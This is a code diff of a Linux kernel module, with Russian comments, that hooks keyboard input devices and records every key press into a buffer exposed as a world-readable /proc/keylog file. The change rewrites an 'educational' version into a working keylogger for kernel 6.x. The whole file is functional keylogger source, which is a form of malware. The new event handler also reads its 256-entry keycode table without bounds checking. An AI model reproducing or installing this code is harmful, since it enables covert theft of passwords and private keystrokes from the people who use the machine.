@@ -1,77 +1,96 @@
 #include <linux/module.h>
+#include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/input.h>
-#include <linux/keyboard.h>
 #include <linux/proc_fs.h>
 #include <linux/uaccess.h>
 #include <linux/slab.h>
-#include <linux/spinlock.h>
+#include <linux/string.h>
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Student");
-MODULE_DESCRIPTION("Educational Keylogger Kernel Module");
+#define LOG_BUF_SIZE 4096
 
-/* ------------------- CONFIG ---------------------- */
-
-#define BUF_SIZE 4096        // размер кольцевого буфера
-static char *log_buf;        // буфер логов
-static int buf_head = 0;     // указатель записи
-static int buf_tail = 0;     // указатель чтения
-static spinlock_t buf_lock;  // защита буфера
+static char *log_buffer;
+static size_t log_size = 0;
 
 static struct proc_dir_entry *proc_entry;
 
-/* ------------------- КОНВЕРТАЦИЯ KEYCODE ---------------------- */
-
-static const char *keymap[] = {
-    "\0", "_ESC_", "1", "2", "3", "4", "5", "6",
-    "7", "8", "9", "0", "-", "=", "_BACKSPACE_",
-    "_TAB_", "q", "w", "e", "r", "t", "y", "u",
-    "i", "o", "p", "[", "]", "\n", "_LCTRL_",
-    "a", "s", "d", "f", "g", "h", "j", "k",
-    "l", ";", "'", "`", "_LSHIFT_", "\\", "z",
-    "x", "c", "v", "b", "n", "m", ",", ".",
-    "/", "_RSHIFT_", "*", "_LALT_", " ", "_CAPS_",
+/*
+ * Таблица keycode → ASCII
+ */
+static const char *keycode_map[256] = {
+    [KEY_ESC] = "<ESC>",
+    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
+    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
+    [KEY_9] = "9", [KEY_0] = "0",
+    [KEY_MINUS] = "-", [KEY_EQUAL] = "=",
+    [KEY_BACKSPACE] = "<BS>",
+    [KEY_TAB] = "<TAB>",
+    [KEY_Q] = "q", [KEY_W] = "w", [KEY_E] = "e", [KEY_R] = "r",
+    [KEY_T] = "t", [KEY_Y] = "y", [KEY_U] = "u", [KEY_I] = "i",
+    [KEY_O] = "o", [KEY_P] = "p",
+    [KEY_A] = "a", [KEY_S] = "s", [KEY_D] = "d", [KEY_F] = "f",
+    [KEY_G] = "g", [KEY_H] = "h", [KEY_J] = "j", [KEY_K] = "k",
+    [KEY_L] = "l",
+    [KEY_Z] = "z", [KEY_X] = "x", [KEY_C] = "c", [KEY_V] = "v",
+    [KEY_B] = "b", [KEY_N] = "n", [KEY_M] = "m",
+    [KEY_SPACE] = " ",
+    [KEY_ENTER] = "\n",
 };
 
-/* ------------------- КОЛЬЦЕВОЙ БУФЕР ---------------------- */
-
-static void buf_write_char(char c) {
-    unsigned long flags;
-    spin_lock_irqsave(&buf_lock, flags);
-
-    log_buf[buf_head] = c;
-    buf_head = (buf_head + 1) % BUF_SIZE;
-
-    if (buf_head == buf_tail)  // переполнение → сдвигаем хвост
-        buf_tail = (buf_tail + 1) % BUF_SIZE;
-
-    spin_unlock_irqrestore(&buf_lock, flags);
-}
-
-static void buf_write_string(const char *s) {
-    while (*s) {
-        buf_write_char(*s++);
-    }
-}
-
-/* ------------------- INPUT HANDLER ---------------------- */
-
-static void handle_key(struct input_handle *handle,
-                       unsigned int type, unsigned int code, int value)
+/*
+ * Добавление строки в буфер
+ */
+static void log_append(const char *msg)
 {
-    if (type != EV_KEY) return;
-    if (value != 1) return; // только нажатие
+    size_t len = strlen(msg);
 
-    if (code < ARRAY_SIZE(keymap)) {
-        buf_write_string(keymap[code]);
-        buf_write_char('\n');
+    if (log_size + len >= LOG_BUF_SIZE) {
+        // кольцевой буфер: сдвигаем влево
+        memmove(log_buffer, log_buffer + len, LOG_BUF_SIZE - len);
+        log_size = LOG_BUF_SIZE - len;
+    }
+
+    memcpy(log_buffer + log_size, msg, len);
+    log_size += len;
+}
+
+/*
+ * Обработчик input событий
+ */
+static void keylogger_event(struct input_handle *handle,
+                            unsigned int type, unsigned int code, int value)
+{
+    if (type != EV_KEY || value != 1) return;
+
+    if (keycode_map[code]) {
+        log_append(keycode_map[code]);
+    } else {
+        char tmp[16];
+        snprintf(tmp, sizeof(tmp), "<%u>", code);
+        log_append(tmp);
     }
 }
 
-static int my_input_connect(struct input_handler *handler,
-                            struct input_dev *dev,
-                            const struct input_device_id *id)
+/*
+ * Проверка: наше ли устройство
+ */
+static bool keylogger_match(struct input_handler *handler,
+                            struct input_dev *dev)
+{
+    if (!dev->name)
+        return false;
+
+    return strstr(dev->name, "kbd") ||
+           strstr(dev->name, "Keyboard") ||
+           strstr(dev->name, "keyboard");
+}
+
+/*
+ * Подключение к устройству
+ */
+static int keylogger_connect(struct input_handler *handler,
+                             struct input_dev *dev,
+                             const struct input_device_id *id)
 {
     struct input_handle *handle;
     int err;
@@ -82,7 +101,7 @@ static int my_input_connect(struct input_handler *handler,
 
     handle->dev = dev;
     handle->handler = handler;
-    handle->name = "my_keylogger";
+    handle->name = "keylogger";
 
     err = input_register_handle(handle);
     if (err) {
@@ -97,93 +116,105 @@ static int my_input_connect(struct input_handler *handler,
         return err;
     }
 
-    printk(KERN_INFO "keylogger: connected to %s\n", dev->name);
+    pr_info("keylogger: connected to %s\n", dev->name);
+
     return 0;
 }
 
-static void my_input_disconnect(struct input_handle *handle)
+/*
+ * Отключение
+ */
+static void keylogger_disconnect(struct input_handle *handle)
 {
     input_close_device(handle);
     input_unregister_handle(handle);
     kfree(handle);
 }
 
-static const struct input_device_id my_ids[] = {
-    { .driver_info = 1 }, /* Match all devices */
+/*
+ * Таблица идентификаторов
+ */
+static const struct input_device_id keylogger_ids[] = {
+    {
+        .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
+        .evbit = { BIT_MASK(EV_KEY) },
+    },
     { }
 };
+MODULE_DEVICE_TABLE(input, keylogger_ids);
 
-MODULE_DEVICE_TABLE(input, my_ids);
-
+/*
+ * Хэндлер
+ */
 static struct input_handler keylogger_handler = {
-    .event      = handle_key,
-    .connect    = my_input_connect,
-    .disconnect = my_input_disconnect,
-    .name       = "my_keylogger_handler",
-    .id_table   = my_ids,
+    .event = keylogger_event,
+    .connect = keylogger_connect,
+    .disconnect = keylogger_disconnect,
+    .name = "keylogger",
+    .id_table = keylogger_ids,
+    .match = keylogger_match,
 };
 
-/* ------------------- /proc интерфейс ---------------------- */
-
-static ssize_t proc_read(struct file *file, char __user *ubuf,
+/*
+ * Чтение из /proc/keylog
+ */
+static ssize_t proc_read(struct file *file, char __user *buf,
                          size_t count, loff_t *ppos)
 {
-    int copied = 0;
-    unsigned long flags;
-
-    if (*ppos > 0)
-        return 0;
-
-    spin_lock_irqsave(&buf_lock, flags);
-
-    while (buf_tail != buf_head && copied < count) {
-        if (put_user(log_buf[buf_tail], ubuf + copied)) {
-            spin_unlock_irqrestore(&buf_lock, flags);
-            return -EFAULT;
-        }
-        buf_tail = (buf_tail + 1) % BUF_SIZE;
-        copied++;
-    }
-
-    spin_unlock_irqrestore(&buf_lock, flags);
-    *ppos = copied;
-
-    return copied;
+    return simple_read_from_buffer(buf, count, ppos,
+                                   log_buffer, log_size);
 }
 
-static const struct file_operations proc_fops = {
-    .owner = THIS_MODULE,
-    .read  = proc_read,
+/*
+ * proc_ops для ядер 5.6+
+ */
+static const struct proc_ops proc_fops = {
+    .proc_read = proc_read,
 };
 
-/* ------------------- INIT / EXIT ---------------------- */
-
+/*
+ * Инициализация модуля
+ */
 static int __init keylogger_init(void)
 {
-    log_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
-    if (!log_buf) return -ENOMEM;
-
-    spin_lock_init(&buf_lock);
+    log_buffer = kzalloc(LOG_BUF_SIZE, GFP_KERNEL);
+    if (!log_buffer)
+        return -ENOMEM;
 
     proc_entry = proc_create("keylog", 0444, NULL, &proc_fops);
     if (!proc_entry) {
-        kfree(log_buf);
+        pr_err("keylogger: cannot create /proc entry\n");
+        kfree(log_buffer);
         return -ENOMEM;
     }
 
-    input_register_handler(&keylogger_handler);
+    if (input_register_handler(&keylogger_handler)) {
+        pr_err("keylogger: input_register_handler failed\n");
+        proc_remove(proc_entry);
+        kfree(log_buffer);
+        return -EINVAL;
+    }
 
-    printk(KERN_INFO "keylogger loaded\n");
+    pr_info("keylogger: loaded successfully\n");
+
     return 0;
 }
 
+/*
+ * Выгрузка
+ */
 static void __exit keylogger_exit(void)
 {
-    proc_remove(proc_entry);
     input_unregister_handler(&keylogger_handler);
-    kfree(log_buf);
-    printk(KERN_INFO "keylogger unloaded\n");
+    proc_remove(proc_entry);
+    kfree(log_buffer);
+
+    pr_info("keylogger: unloaded\n");
 }
 
 module_init(keylogger_init);
 module_exit(keylogger_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Aleksey Pardaev");
+MODULE_DESCRIPTION("Simple keylogger module for Linux kernel 6.x");
